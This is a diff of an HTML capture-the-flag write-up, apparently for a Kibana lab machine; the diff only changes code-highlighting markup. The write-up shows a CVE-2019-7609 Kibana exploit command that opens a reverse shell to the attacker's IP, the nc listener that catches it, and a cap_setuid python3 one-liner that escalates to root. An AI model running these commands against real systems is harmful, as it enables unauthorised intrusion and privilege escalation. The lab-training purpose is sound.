@@ -125,71 +125,71 @@
 <blockquote>
 <p>Using nmap found</p>
 </blockquote>
-<pre class="codehilite"><code>PORT     STATE SERVICE     REASON
+<div class="codehilite"><pre><span></span><code>PORT     STATE SERVICE     REASON
 22/tcp   open  ssh         syn-ack ttl 63
 80/tcp   open  http        syn-ack ttl 63
 5044/tcp open  lxi-evntsvc syn-ack ttl 63
 5601/tcp open  esmagent    syn-ack ttl 63
-</code></pre>
+</code></pre></div>
 
 <blockquote>
 <p>so in target:5601 has kibana dashborad</p>
 <p>Using this https://github.com/LandGrey/CVE-2019-7609.git repo</p>
 </blockquote>
-<pre class="codehilite"><code>❯ python2 exploit.py -u http://10.201.55.184:5601/ -host 10.21.16.42 -port 4444 --shell
+<div class="codehilite"><pre><span></span><code>❯ python2 exploit.py -u http://10.201.55.184:5601/ -host 10.21.16.42 -port 4444 --shell
 [+] http://10.201.55.184:5601 maybe exists CVE-2019-7609 (kibana &lt; 6.6.1 RCE) vulnerability
 [+] reverse shell completely! please check session on: 10.21.16.42:4444
-</code></pre>
+</code></pre></div>
 
 <blockquote>
 <p>Finally get reverse shell</p>
 </blockquote>
-<pre class="codehilite"><code>❯ nc -nvlp 4444
-listening on [any] 4444 ...
-connect to [10.21.16.42] from (UNKNOWN) [10.201.55.184] 45634
-bash: cannot set terminal process group (961): Inappropriate ioctl for device
-bash: no job control in this shell
-To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
-See &quot;man sudo_root&quot; for details.
+<div class="codehilite"><pre><span></span><code><span class="err">❯</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">nvlp</span><span class="w"> </span><span class="mi">4444</span>
+<span class="n">listening</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="p">[</span><span class="nb">any</span><span class="p">]</span><span class="w"> </span><span class="mi">4444</span><span class="w"> </span><span class="o">...</span>
+<span class="n">connect</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="p">[</span><span class="mf">10.21.16.42</span><span class="p">]</span><span class="w"> </span><span class="kn">from</span><span class="w"> </span><span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="mf">10.201.55.184</span><span class="p">]</span><span class="w"> </span><span class="mi">45634</span>
+<span class="n">bash</span><span class="p">:</span><span class="w"> </span><span class="n">cannot</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span><span class="n">terminal</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="n">group</span><span class="w"> </span><span class="p">(</span><span class="mi">961</span><span class="p">):</span><span class="w"> </span><span class="n">Inappropriate</span><span class="w"> </span><span class="n">ioctl</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">device</span>
+<span class="n">bash</span><span class="p">:</span><span class="w"> </span><span class="n">no</span><span class="w"> </span><span class="n">job</span><span class="w"> </span><span class="n">control</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">shell</span>
+<span class="n">To</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">administrator</span><span class="w"> </span><span class="p">(</span><span class="n">user</span><span class="w"> </span><span class="s2">&quot;root&quot;</span><span class="p">),</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="s2">&quot;sudo &lt;command&gt;&quot;</span><span class="o">.</span>
+<span class="n">See</span><span class="w"> </span><span class="s2">&quot;man sudo_root&quot;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">details</span><span class="o">.</span>
 
-kiba@ubuntu:/home/kiba/kibana/bin$ python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
-&lt;na/bin$ python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'                     
-To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
-See &quot;man sudo_root&quot; for details.
-</code></pre>
+<span class="n">kiba</span><span class="nd">@ubuntu</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kiba</span><span class="o">/</span><span class="n">kibana</span><span class="o">/</span><span class="nb">bin</span><span class="err">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+<span class="o">&lt;</span><span class="n">na</span><span class="o">/</span><span class="nb">bin</span><span class="err">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span><span class="w">                     </span>
+<span class="n">To</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">administrator</span><span class="w"> </span><span class="p">(</span><span class="n">user</span><span class="w"> </span><span class="s2">&quot;root&quot;</span><span class="p">),</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="s2">&quot;sudo &lt;command&gt;&quot;</span><span class="o">.</span>
+<span class="n">See</span><span class="w"> </span><span class="s2">&quot;man sudo_root&quot;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">details</span><span class="o">.</span>
+</code></pre></div>
 
 <blockquote>
 <p>after using this command find</p>
 </blockquote>
-<pre class="codehilite"><code>getcap -r / 2&gt;/dev/null
-</code></pre>
+<div class="codehilite"><pre><span></span><code>getcap -r / 2&gt;/dev/null
+</code></pre></div>
 
 <blockquote>
 <p>To check what capabilities are already existing on the victim machine, type: <strong><em>getcap -r /</em></strong> <strong><em>2&gt;/dev/null</em></strong>. I again added the 2&gt;/dev/null to weed the permission errors from showing up as part of the search results:</p>
 </blockquote>
-<pre class="codehilite"><code>kiba@ubuntu:/home/kiba$ getcap -r / 2&gt;/dev/null
-getcap -r / 2&gt;/dev/null
-/home/kiba/.hackmeplease/python3 = cap_setuid+ep
-/usr/bin/mtr = cap_net_raw+ep
-/usr/bin/traceroute6.iputils = cap_net_raw+ep
-/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="n">kiba</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kiba</span><span class="err">$</span><span class="w"> </span><span class="n">getcap</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="k">null</span>
+<span class="n">getcap</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="k">null</span>
+<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kiba</span><span class="o">/</span><span class="p">.</span><span class="n">hackmeplease</span><span class="o">/</span><span class="n">python3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cap_setuid</span><span class="o">+</span><span class="n">ep</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">mtr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cap_net_raw</span><span class="o">+</span><span class="n">ep</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">traceroute6</span><span class="p">.</span><span class="n">iputils</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cap_net_raw</span><span class="o">+</span><span class="n">ep</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">systemd</span><span class="o">-</span><span class="n">detect</span><span class="o">-</span><span class="n">virt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cap_dac_override</span><span class="p">,</span><span class="n">cap_sys_ptrace</span><span class="o">+</span><span class="n">ep</span>
+</code></pre></div>
 
 <blockquote>
 <p>to exploit the file with capabilities and change user kiba’s UID to root.</p>
 </blockquote>
-<pre class="codehilite"><code>./python3 -c ‘import os; os.setuid(0); os.system(“/bin/bash”)’
+<div class="codehilite"><pre><span></span><code><span class="o">./</span><span class="n">python3</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="err">‘</span><span class="kn">import</span><span class="w"> </span><span class="nn">os</span><span class="p">;</span><span class="w"> </span><span class="n">os</span><span class="o">.</span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"> </span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="err">“</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span><span class="err">”</span><span class="p">)</span><span class="err">’</span>
 
 
-kiba@ubuntu:/home/kiba$ /home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)'
-&lt;on3 -c 'import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)'
-</code></pre>
+<span class="n">kiba</span><span class="nd">@ubuntu</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kiba</span><span class="err">$</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kiba</span><span class="o">/.</span><span class="n">hackmeplease</span><span class="o">/</span><span class="n">python3</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="s1">&#39;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#39;</span>
+<span class="o">&lt;</span><span class="n">on3</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="s1">&#39;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#39;</span>
+</code></pre></div>
 
 <blockquote>
 <p>To find root flag</p>
 </blockquote>
-<pre class="codehilite"><code>find / -name root.txt 2&gt;/dev/null
-</code></pre>
+<div class="codehilite"><pre><span></span><code>find / -name root.txt 2&gt;/dev/null
+</code></pre></div>
         </div>
     </main>
 
